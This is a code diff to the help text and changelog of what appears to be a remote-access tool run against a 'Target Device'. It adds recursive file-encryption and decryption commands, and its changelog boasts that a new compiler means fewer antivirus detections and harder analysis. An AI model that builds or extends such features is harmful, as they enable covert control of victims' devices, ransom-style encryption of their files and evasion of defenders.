@@ -244,11 +244,25 @@ const helpDict = {
       "explanation": "Enables Location Services on the Target Device.",
       "category": "Utility"
   },
+  "encrypt": {
+      "explanation": "Encrypts the given Directory recursively or File.",
+      "category": "Utility"
+  },
+  "decrypt": {
+      "explanation": "Decrypts the given Directory recursively or File.",
+      "category": "Utility"
+  }
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
-    { v: "v9.2", note: [
+ { v: "v9.3", note: [
+    "Added:",
+    "!encrypt -> Encypts Directory or File",
+    "!decrypt -> Decrypts Directory or File"
+    ].join("\n")
+  },
+  { v: "v9.2", note: [
     "Switched from PyInstaller to Nuitka",
     "Less Detections, faster runtime, less possibility to debug and analyze >:D",
     ].join("\n")
